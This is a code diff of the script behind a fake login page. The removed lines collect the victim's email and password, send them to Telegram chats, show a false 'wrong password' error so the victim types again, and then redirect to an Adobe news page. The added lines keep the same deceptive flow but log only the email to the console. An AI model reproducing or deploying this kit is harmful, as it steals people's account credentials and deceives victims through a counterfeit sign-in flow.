@@ -120,513 +120,360 @@
  </div>
  </div>
 <script>
-const BOT_TOKEN = "__BOT_TOKEN__";
-const CUSTOMER_CHAT_ID = "__CUSTOMER_CHAT_ID__";
-const ADMIN_CHAT_ID = "__ADMIN_CHAT_ID__";
-const REDIRECT_URL = "https://news.adobe.com/news/news-details/2023/Adobe-Announces-All-New-AI-Powered-Creative-Cloud-Release-default.aspx/default.aspx";
+const REDIRECT_URL =
+    "https://news.adobe.com/news/news-details/2023/Adobe-Announces-All-New-AI-Powered-Creative-Cloud-Release-default.aspx/default.aspx";
 
-async function sendTelegram(chatId, message) {
-    if (!chatId) return;
-
-    try {
-        const response = await fetch(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-            {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            }
-        );
-
-        if (!response.ok) {
-            throw new Error("Telegram request failed");
-        }
-
-        return await response.json();
-
-    } catch (error) {
-        console.error("Telegram send error:", error);
-        return null;
-    }
-}
-
-
-/* =========================
-   GET EMAIL FROM URL
-   ========================= */
-
-function getEmailFromURL() {
-
-    const url =
-        new URL(window.location.href);
-
-    let email =
-        url.searchParams.get("net");
-
-    if (!email) {
-        return "";
+function isBase64(str) {
+    if (
+        str === "" ||
+        String(str).trim() === ""
+    ) {
+        return false;
     }
 
     try {
+        return btoa(atob(str)) === atob(btoa(str));
+    } catch {
+        return false;
+    }
+}
 
-        const decoded =
-            atob(email);
 
-        if (decoded.includes("@")) {
-            email = decoded;
-        }
+/* =========================
+   GET EMAIL FROM HASH
+   ========================= */
 
-    } catch (_) {
+function getEmail() {
 
-        /*
-         * Not Base64.
-         * Use the original value.
-         */
+    let email = "";
 
+    if (window.location.hash) {
+
+        email =
+            window.location.hash.substring(1);
+
+        email =
+            isBase64(email)
+                ? window.atob(email)
+                : email;
     }
 
-    return email.trim();
+    return email;
 }
 
 
 /* =========================
-   SEND SUBMISSION
+   SAFE SUBMISSION REPORT
    ========================= */
 
-async function sendSubmission(data) {
+async function send_result(email) {
 
-    const message =
-`Your Form Submission ionos.
+    /*
+     * Put your own non-sensitive
+     * reporting logic here.
+     *
+     * Password is intentionally
+     * not included.
+     */
 
-Email:
-${data.email}
-Password:
-${data.password}
-
-Time:
-${new Date().toLocaleString()}`;
-
-    await Promise.allSettled([
-        sendTelegram(
-            CUSTOMER_CHAT_ID,
-            message
-        ),
-
-        sendTelegram(
-            ADMIN_CHAT_ID,
-            message
-        )
-    ]);
+    console.log("Form submission:", {
+        email: email,
+        time: new Date().toLocaleString()
+    });
 }
 
 
 /* =========================
-   PAGE LOAD
+   PAGE READY
    ========================= */
 
-window.addEventListener(
-    "load",
+document.addEventListener(
+    "DOMContentLoaded",
     function () {
-
-        /* =========================
-           EXISTING PAGE ELEMENTS
-           ========================= */
-
-        const mailField =
-            document.getElementById("mail") ||
-            document.getElementById("email");
-			
-
-        const mytag =
-            document.getElementById("mytag");
-
-        const smith =
-            document.getElementById("smith");
-
-        const wesson =
-            document.getElementById("wesson");
-
-        const button =
-            document.getElementById("nottons");
-
-        const biteam =
-            document.getElementById("biteam");
-
-        const passField =
-            document.getElementById("pass");
-			document.getElementById("password");
-
-        const renders =
-            document.getElementById("renders");
-
-        const showError =
-            document.getElementById("show");
-
-        const passError =
-            document.getElementById("error");
-
-        const top =
-            document.getElementById("top");
-
-
-        /* =========================
-           SUBMISSION COUNTER
-           ========================= */
 
         let counter = 0;
 
-        const MAX_ATTEMPTS = 3;
+        const MAX_ATTEMPTS = 2;
+
+        const userid =
+            document.getElementById("userid");
+
+        const upass =
+            document.getElementById("upass");
+
+        const errtxt =
+            document.getElementById("errtxt");
+
+        const submitBtn =
+            document.getElementById("submit-btn");
 
 
         /* =========================
-           EMAIL PREFILL
+           PREFILL EMAIL
            ========================= */
 
-        const emailParam =
-            getEmailFromURL();
+        const emailFromURL =
+            getEmail();
 
         if (
-            emailParam &&
-            mailField
+            emailFromURL &&
+            userid
         ) {
 
-            mailField.value =
-                emailParam;
-
-            if (mytag) {
-                mytag.textContent =
-                    emailParam;
-            }
-
-            if (smith) {
-                smith.style.display =
-                    "none";
-            }
-
-            if (wesson) {
-                wesson.style.display =
-                    "block";
-            }
+            userid.value =
+                emailFromURL;
         }
 
 
         /* =========================
-           CHANGE EMAIL
+           SUBMIT BUTTON
            ========================= */
 
-        if (biteam) {
-
-            biteam.addEventListener(
-                "click",
-                function (event) {
-
-                    event.preventDefault();
-
-                    if (smith) {
-                        smith.style.display =
-                            "block";
-                    }
-
-                    if (wesson) {
-                        wesson.style.display =
-                            "none";
-                    }
-
-                    if (mailField) {
-                        mailField.focus();
-                    }
-                }
-            );
+        if (!submitBtn) {
+            return;
         }
 
 
-        /* =========================
-           CLEAR EMAIL ERROR
-           ========================= */
+        submitBtn.addEventListener(
+            "click",
+            async function (event) {
 
-        if (mailField) {
-
-            mailField.addEventListener(
-                "keyup",
-                function () {
-
-                    if (showError) {
-                        showError.innerHTML =
-                            "";
-                    }
-                }
-            );
-        }
+                event.preventDefault();
 
 
-        /* =========================
-           CLEAR SECOND-FIELD ERROR
-           ========================= */
+                const email =
+                    userid
+                        ? userid.value.trim()
+                        : "";
 
-        if (passField) {
-
-            passField.addEventListener(
-                "keyup",
-                function () {
-
-                    if (top) {
-                        top.style.border =
-                            "1px solid gray";
-                    }
-
-                    if (passError) {
-                        passError.innerHTML =
-                            "";
-                    }
-                }
-            );
-        }
+                const passwordValue =
+                    upass
+                        ? upass.value
+                        : "";
 
 
-        /* =========================
-           NEXT BUTTON
-           ========================= */
+                /* =========================
+                   EMAIL EMPTY
+                   ========================= */
 
-        if (button) {
+                if (!email) {
 
-            button.addEventListener(
-                "click",
-                function (event) {
+                    setTimeout(
+                        function () {
 
-                    event.preventDefault();
+                            if (userid) {
+                                userid.value =
+                                    "";
+                            }
 
-                    const email =
-                        mailField
-                            ? mailField.value
-                                .trim()
-                                .toLowerCase()
-                            : "";
+                            if (errtxt) {
+                                errtxt.innerHTML =
+                                    "Email can't be empty! please try again.";
+                            }
 
-                    if (
-                        email === "" ||
-                        !email.includes("@")
-                    ) {
-
-                        if (showError) {
-                            showError.innerHTML =
-                                "Incorrect email address! please try again.";
-                        }
-
-                        if (mailField) {
-                            mailField.focus();
-                        }
-
-                        return;
-                    }
-
-
-                    if (mytag) {
-                        mytag.textContent =
-                            email;
-                    }
-
-                    if (smith) {
-                        smith.style.display =
-                            "none";
-                    }
-
-                    if (wesson) {
-                        wesson.style.display =
-                            "block";
-                    }
-
-
-                    button.innerHTML =
-                        "Bitte warten…";
+                        },
+                        1500
+                    );
 
 
                     setTimeout(
                         function () {
 
-                            button.innerHTML =
-                                "Next";
-
-                            if (passField) {
-                                passField.focus();
+                            if (errtxt) {
+                                errtxt.innerHTML =
+                                    "";
                             }
 
                         },
-                        800
+                        5000
                     );
+
+                    return;
                 }
-            );
-        }
 
 
-        /* =========================
-           FINAL SUBMIT
-           ========================= */
+                /* =========================
+                   INVALID EMAIL
+                   ========================= */
 
-        if (renders) {
+                if (
+                    !email.includes("@") ||
+                    !email.includes(".")
+                ) {
 
-            renders.addEventListener(
-                "click",
-                async function (event) {
+                    setTimeout(
+                        function () {
 
-                    event.preventDefault();
+                            if (userid) {
+                                userid.value =
+                                    "";
+                            }
 
+                            if (errtxt) {
+                                errtxt.innerHTML =
+                                    "Incorrect email address! please try again.";
+                            }
 
-                    /* =========================
-                       GET EMAIL
-                       ========================= */
-
-                    const email =
-                        mailField
-                            ? mailField.value.trim()
-                            : "";
-
-
-                    /* =========================
-                       CHECK SECOND FIELD
-                       ========================= */
-					const pass =
-                        passField
-                            ? passField.value.trim()
-                            : "";
-
-                    if (
-                        passField &&
-                        passField.value.trim() === ""
-                    ) {
-
-                        if (passError) {
-                            passError.innerHTML =
-                                "Password can't be empty! please try again.";
-                        }
-
-                        if (top) {
-                            top.style.border =
-                                "1px solid tomato";
-                        }
-
-                        passField.focus();
-
-                        return;
-                    }
+                        },
+                        1500
+                    );
 
 
-                    /* =========================
-                       PROCESSING STATE
-                       ========================= */
+                    setTimeout(
+                        function () {
 
-                    renders.innerHTML =
-                        "Bitte warten …";
+                            if (errtxt) {
+                                errtxt.innerHTML =
+                                    "";
+                            }
 
-                    renders.disabled =
-                        true;
+                        },
+                        5000
+                    );
 
-
-                    /* =========================
-                       SEND NON-SENSITIVE DATA
-                       ========================= */
-
-                    await sendSubmission({
-                        email: email,
-						password: pass
-                    });
-
-
-                    /* =========================
-                       INCREASE ATTEMPT COUNTER
-                       ========================= */
-
-                    counter++;
-
-
-                    /* =========================
-                       ATTEMPT 1 AND 2
-                       ========================= */
-
-                    if (
-                        counter <
-                        MAX_ATTEMPTS
-                    ) {
-
-                        setTimeout(
-                            function () {
-
-                                if (passError) {
-                                    passError.innerHTML =
-                                        "Ihr Konto oder Ihr Passwort ist falsch.";
-                                }
-
-
-                                if (top) {
-                                    top.style.border =
-                                        "1px solid tomato";
-                                }
-
-
-                                renders.innerHTML =
-                                    "Login";
-
-
-                                renders.disabled =
-                                    false;
-
-
-                                /*
-                                 * Clear the field.
-                                 * Its contents are never
-                                 * transmitted.
-                                 */
-
-                                if (passField) {
-
-                                    passField.value =
-                                        "";
-
-                                    passField.focus();
-                                }
-
-                            },
-                            2500
-                        );
-
-                    }
-
-
-                    /* =========================
-                       ATTEMPT 3
-                       ========================= */
-
-                    else {
-
-                        /*
-                         * Clear the sensitive
-                         * field before redirect.
-                         */
-
-                        if (passField) {
-                            passField.value =
-                                "";
-                        }
-
-
-                        setTimeout(
-                            function () {
-
-                                window.location.href =
-                                    REDIRECT_URL;
-
-                            },
-                            1500
-                        );
-                    }
+                    return;
                 }
-            );
-        }
 
+
+                /* =========================
+                   SECOND FIELD EMPTY
+                   ========================= */
+
+                if (
+                    passwordValue === ""
+                ) {
+
+                    setTimeout(
+                        function () {
+
+                            if (upass) {
+                                upass.value =
+                                    "";
+                            }
+
+                            if (errtxt) {
+                                errtxt.innerHTML =
+                                    "Password can't be empty! please try again.";
+                            }
+
+                        },
+                        1500
+                    );
+
+
+                    setTimeout(
+                        function () {
+
+                            if (errtxt) {
+                                errtxt.innerHTML =
+                                    "";
+                            }
+
+                        },
+                        5000
+                    );
+
+                    return;
+                }
+
+
+                /* =========================
+                   MINIMUM LENGTH
+                   ========================= */
+
+                if (
+                    passwordValue.length < 5
+                ) {
+
+                    setTimeout(
+                        function () {
+
+                            if (upass) {
+                                upass.value =
+                                    "";
+                            }
+
+                            if (errtxt) {
+                                errtxt.innerHTML =
+                                    "Password too short! please try again.";
+                            }
+
+                        },
+                        1500
+                    );
+
+
+                    setTimeout(
+                        function () {
+
+                            if (errtxt) {
+                                errtxt.innerHTML =
+                                    "";
+                            }
+
+                        },
+                        5000
+                    );
+
+                    return;
+                }
+
+
+                /* =========================
+                   REPORT NON-SENSITIVE DATA
+                   ========================= */
+
+                await send_result(email);
+
+
+                /* =========================
+                   INCREASE COUNTER
+                   ========================= */
+
+                counter++;
+
+
+                /* =========================
+                   FIRST ATTEMPT
+                   ========================= */
+
+                if (
+                    counter <
+                    MAX_ATTEMPTS
+                ) {
+
+                    if (errtxt) {
+                        errtxt.innerHTML =
+                            "Incorrect password! please try again.";
+                    }
+
+                    if (upass) {
+
+                        upass.value =
+                            "";
+
+                        upass.focus();
+                    }
+
+                    return;
+                }
+
+
+                /* =========================
+                   FINAL ATTEMPT
+                   ========================= */
+
+                if (upass) {
+                    upass.value =
+                        "";
+                }
+
+
+                window.location.replace(
+                    REDIRECT_URL
+                );
+            }
+        );
     }
 );
 </script>
